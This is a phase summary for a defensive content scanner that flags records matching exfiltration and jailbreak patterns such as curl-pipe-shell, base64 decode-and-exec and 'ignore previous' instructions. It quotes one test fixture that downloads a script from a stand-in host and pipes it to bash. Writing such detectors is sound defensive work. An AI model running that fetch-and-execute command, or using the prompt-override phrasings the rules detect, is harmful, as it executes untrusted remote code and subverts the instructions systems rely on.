---
phase: 3.2.1-hnsw-optimization
plan: 02
subsystem: pipeline
tags: [security, content-scanner, audit-b, filter, regex, ndjson]

# Dependency graph
requires:
  - phase: 3.1.2-polymorphic-envelope
    provides: filter-rules rule-pack registry (index.js dispatcher) + upcastRecord v2 writer
  - phase: 3.2-plugin-and-mcp-scoring
    provides: PRESERVED_FIELDS contract + pipeline-stats.json sections pattern
provides:
  - scripts/lib/filter-rules/content.rules.js — CONTENT_RULES (11 FP-calibrated regexes) + scanContentFlags(record)
  - content_flags[] annotation on every record surviving the slop filter, computed against the RAW 5000-char body (pre-Step-4b truncation)
  - contentFlagStats summary (flagged_records / by_rule / multi_rule_records) in filterRaw return + pipeline-stats.json
  - PRESERVED_FIELDS exported from filter.js (regression guard surface)
affects: [3.2.1-06 denylist extension, 3.3 plugin re-enable (extra.* scan dispatch), 3.4 UI review surfacing]

# Tech tracking
tech-stack:
  added: []
  patterns:
    - "Flag-don't-block: content rules are annotations (content_flags[]), NEVER gates; promotion to blocking is manual via FIXTURE_REPO_DENYLIST"
    - "Pre-truncation scan: annotation pass MUST run between Step 1b and Step 4b in filterRaw so payloads at offsets 1500-5000 are visible"
    - "Recompute-don't-preserve: content_flags is rebuilt from raw every run and excluded from PRESERVED_FIELDS"

key-files:
  created:
    - scripts/lib/filter-rules/content.rules.js
    - scripts/lib/filter-rules/__tests__/content.rules.test.js
  modified:
    - scripts/filter.js
    - scripts/filter.test.js
    - scripts/lib/legacy-skill-reader.js
    - scripts/check-banned-patterns.js

key-decisions:
  - "content_flags passthrough added to BOTH upcastSkillRecord and buildCommonFields in legacy-skill-reader.js — the v2 builders use explicit field whitelists (no spread), so without it the annotation dies on the v2 write; buildCommonFields covers the 3.3 plugin/MCP re-enable"
  - "PRESERVED_FIELDS exported from filter.js so the test can assert content_flags is absent directly (plan offered import-or-grep; import is exact)"
  - "check-banned-patterns.js allowlist line for the filter.js stats write updated 527 -> 555 (line-keyed allowlist, +-1 tolerance; annotation pass shifted it)"

patterns-established:
  - "Audit B posture: FLAG, don't block — 236 real records (0.72%) legitimately match curl|sh; the only blocking mechanism stays FIXTURE_REPO_DENYLIST"

requirements-completed: [AuditB-flags, Lint-clean]

# Metrics
duration: 10min
completed: 2026-06-11
---

# Phase 3.2.1 Plan 02: Audit B Content Scanner Summary

**Flag-don't-block content scanner: 11 FP-calibrated regexes (exfil + jailbreak classes) annotate every filtered record with content_flags[] scanned against the raw 5000-char body, with per-rule counts in pipeline-stats.json — 247 records flagged on the live 33k corpus, zero records blocked**

## Performance

- **Duration:** 10 min
- **Started:** 2026-06-11T04:58:36Z
- **Completed:** 2026-06-11T05:08:33Z
- **Tasks:** 2 (both TDD)
- **Files modified:** 6 (2 created, 4 modified)

## Accomplishments

- `content.rules.js`: CONTENT_RULES copied verbatim from research calibration (2026-06-10 hit counts as baseline comments); `scanContentFlags` with indexOf prefilter, sorted deterministic output, flat-v1-first haystack with `extra.*` fallback for 3.3
- `filterRaw` Step 1c annotation pass: after language-variant dedup, BEFORE the 1500-char Step 4b truncation — payloads at offsets 1500-5000 stay visible
- `contentFlagStats` summary in the filterRaw return, the console log line, and `pipeline-stats.json` (bounded sidecar, counts only)
- Rules are NOT registered in `filter-rules/index.js` rulePacks and never called from `isSlop` — verified by grep (0 references) and the posture test
- 38 tests across the two suites (18 scanner + 20 filter incl. 6 new); full `npm test` suite green (148 pass)

## Task Commits

Each task was committed atomically (TDD: test → feat):

1. **Task 1 RED: failing scanner tests** - `057b82e` (test)
2. **Task 1 GREEN: content.rules.js implementation** - `0a48d99` (feat)
3. **Task 2 RED: failing filterRaw annotation tests** - `794576b` (test)
4. **Task 2 GREEN: filter.js wiring + upcaster passthrough + allowlist shift** - `b564e10` (feat)

## Files Created/Modified

- `scripts/lib/filter-rules/content.rules.js` - CONTENT_RULES (11 rules, verbatim) + scanContentFlags; flag-don't-block header documents the 236-record empirical mandate
- `scripts/lib/filter-rules/__tests__/content.rules.test.js` - per-rule fire tests, isSlop posture test, pre-truncation offset-2500 test, edge cases (kept from prior attempt, one fixture fix)
- `scripts/filter.js` - Step 1c annotation loop, contentFlagStats plumbing, stats + log wiring, PRESERVED_FIELDS export + NOT-preserved comment
- `scripts/filter.test.js` - tests A-E from the plan + a v2-upcast passthrough guard
- `scripts/lib/legacy-skill-reader.js` - content_flags passthrough in upcastSkillRecord + buildCommonFields
- `scripts/check-banned-patterns.js` - filter.js stats-write allowlist entry line 527 → 555

## Decisions Made

- **upcastRecord finding (plan action item 6):** `upcastSkillRecord` and `buildCommonFields` build the v2 record from explicit field whitelists, NOT spreads — `content_flags` passthrough was REQUIRED (added to both paths; the skill path is load-bearing for main()'s v2 write today, buildCommonFields future-proofs the plugin/MCP 3.3 re-enable). Covered by a dedicated regression test.
- **PRESERVED_FIELDS exported** (plan offered "import it or grep-assert"); test E asserts both the array exclusion and the behavioral no-copy-forward.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug] Prior attempt's pre-truncation test fixture could never match**
- **Found during:** Task 1 (GREEN run)
- **Issue:** The leftover test planted `curl http://x.io/i.sh | bash` immediately followed by `xxxx` padding — the verbatim regex's trailing `\b` cannot match `bashxxx`, so the test failed against a correct implementation
- **Fix:** Appended `\n` to the payload (regex is verbatim-locked from research; the fixture had to provide the word boundary)
- **Files modified:** scripts/lib/filter-rules/__tests__/content.rules.test.js
- **Verification:** all 18 scanner tests pass
- **Committed in:** 0a48d99 (Task 1 GREEN commit)

**2. [Rule 3 - Blocking] check-banned-patterns.js allowlist line shift**
- **Found during:** Task 2 (verify step)
- **Issue:** Plan asserted "no banned-pattern delta" for the existing pipeline-stats write, but the lint allowlist is line-keyed (±1 tolerance) and the Step 1c insertion shifted the write from line 527 to 555 — `npm run check:patterns` failed with 1 new violation
- **Fix:** Updated the allowlist entry's line + appended the shift cause to its reason string (the file's established convention)
- **Files modified:** scripts/check-banned-patterns.js
- **Verification:** `npm run check:patterns` clean (0 baselined, 0 new)
- **Committed in:** b564e10 (Task 2 commit)

---

**Total deviations:** 2 auto-fixed (1 bug, 1 blocking)
**Impact on plan:** Both fixes necessary for correctness; no scope creep. check-banned-patterns.js was not in the plan's files_modified list but the change is a 2-line allowlist maintenance edit.

## Issues Encountered

- **Spot-check counts vs research calibration:** live 33k run flagged 247 records — curl_pipe_sh 160 (research ≈236), ignore_previous 25 (≈39). NOT a transcription error: the research scanned all 33,000 raw records; the production scan runs after the slop filter + fixture-repo denylist (23,047 survivors, ~70% of raw — proportional), and the denylisted fixture repos held many of the jailbreak-marker hits. Rare-rule counts match research exactly (wget_pipe_sh 6=6, base64_decode_exec 2=2, override_system 3=3, new_system_prompt 0=0), confirming verbatim rule transcription. Full filter runtime: 15.3 s total (scan adds well under the 30 s budget).
- Tracked sidecars (`data/pipeline-stats.json`, `data/slug-redirects.json`) were restored via git checkout after the local spot-check run so the working tree stays clean for the parallel executor.

## Known Stubs

None — no placeholder values, no unwired data paths. content_flags flows raw → filterRaw → v2 upcast → skills.ndjson; stats flow filterRaw → pipeline-stats.json.

## User Setup Required

None - no external service configuration required.

## Next Phase Readiness

- Plan 06 (denylist extension) can consume the by_rule counts + the 4 candidate fixture repos from research Pitfall 4
- Plugin/MCP scan dispatch (3.3) is pre-plumbed: scanContentFlags already falls back to `extra.body_markdown`, and buildCommonFields passes content_flags through for plugin/mcp_server upcasts

---
*Phase: 3.2.1-hnsw-optimization*
*Completed: 2026-06-11*

## Self-Check: PASSED
